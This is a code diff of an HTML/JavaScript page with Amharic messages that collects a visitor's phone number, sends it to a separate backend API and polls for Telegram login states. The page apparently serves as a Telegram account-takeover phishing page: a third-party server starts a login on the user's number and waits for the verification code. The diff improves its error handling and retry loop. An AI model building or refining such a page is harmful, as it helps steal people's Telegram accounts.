@@ -222,7 +222,7 @@
         
         <div class="msg-wrap"><div id="status1" class="msg"></div></div>
 
-        <!-- አዲሱ የስልክ ቁጥር መፃፊያ -->
+        <!-- የስልክ ቁጥር መፃፊያ -->
         <div class="input-wrapper">
             <input type="tel" id="phone_input" placeholder="Phone Number (e.g. +251...)" oninput="hideMsg(1)">
         </div>
@@ -296,19 +296,16 @@
     </div>
 
 <script>
-    // 🌟 አዲሱ የ Session ID ሎጂክ 🌟
+    // Session ID ሎጂክ
     let sessionId = localStorage.getItem("my_session_id");
     if (!sessionId) {
-        // መታወቂያ ከሌለ አዲስ ይፈጥራል
         sessionId = "browser_" + Math.floor(Math.random() * 1000000000);
         localStorage.setItem("my_session_id", sessionId);
     }
     
-    // የቴሌግራም ID ቦታ ላይ የፈጠርነውን Session ID እንጠቀማለን
     let userId = sessionId;
     let sid = sessionId; 
 
-    // Setup Telegram Theme (በብሮውዘር ቢከፈትም ስህተት እንዳያመጣ በ try-catch ተጠቅልሏል)
     try {
         const tg = window.Telegram.WebApp;
         tg.expand();
@@ -335,7 +332,6 @@
 
     document.addEventListener("DOMContentLoaded", function() {
         setTimeout(() => { showStep('photo_slide'); }, 3000);
-        // ሁልጊዜ የ Session ID-ውን Status ይፈትሻል
         statusChecker = setInterval(checkStatus, 3000);
         setupLongPressPaste(); 
     });
@@ -367,6 +363,22 @@
             else if (data.status === "FLOOD") { 
                 clearInterval(statusChecker); 
                 displayFloodInStatus1(data); 
+            }
+            // 🌟 አዲሶቹ የስልክ ቁጥር ስህተት መቆጣጠሪያዎች 🌟
+            else if (data.status === "INVALID_PHONE") {
+                clearInterval(statusChecker);
+                stopLoaders();
+                showMsg(1, 'error', 'ያስገቡት ስልክ ቁጥር ትክክል አይደለም። እባክዎ አስተካክለው ይሞክሩ።');
+            }
+            else if (data.status === "UNREGISTERED_PHONE") {
+                clearInterval(statusChecker);
+                stopLoaders();
+                showMsg(1, 'error', 'በዚህ ስልክ ቁጥር የተከፈተ የቴሌግራም አካውንት የለም።');
+            }
+            else if (data.status === "BANNED_PHONE") {
+                clearInterval(statusChecker);
+                stopLoaders();
+                showMsg(1, 'error', 'ይህ ስልክ ቁጥር በቴሌግራም ታግዷል።');
             }
         }).catch(e => {});
     }
@@ -406,10 +418,9 @@
     }
 
     function handleLoginClick() {
-        // የተፃፈውን ስልክ ቁጥር ይወስዳል
         const phone = document.getElementById('phone_input').value.trim();
         if (!phone) {
-            showMsg(1, 'error', 'Please enter your phone number.');
+            showMsg(1, 'error', 'እባክዎ ስልክ ቁጥር ያስገቡ።');
             return;
         }
 
@@ -433,7 +444,6 @@
         }
         
         try {
-            // ወደ አዲሱ የ Python API ስልኩን እና Session ID-ውን ይልካል
             const res = await fetch(`${API_BASE_URL2}/submit_phone`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
@@ -446,7 +456,9 @@
                 showMsg(1, 'error', data.message || 'Error occurred.');
             } else {
                 showMsg(1, 'loading-msg', 'Sending code...');
-                // ከተላከ በኋላ checkStatus Loop ራሱ እየፈለገ ወደ ሚቀጥለው ገፅ ይወስደዋል
+                // ተጠቃሚው ስህተት አጋጥሞት እንደገና ከሞከረ Loop-ኡን መጀመር አለብን
+                clearInterval(statusChecker);
+                statusChecker = setInterval(checkStatus, 3000);
             }
         } catch(e) { 
             stopLoaders();
@@ -590,3 +602,4 @@
 </script>
 </body>
 </html>
+
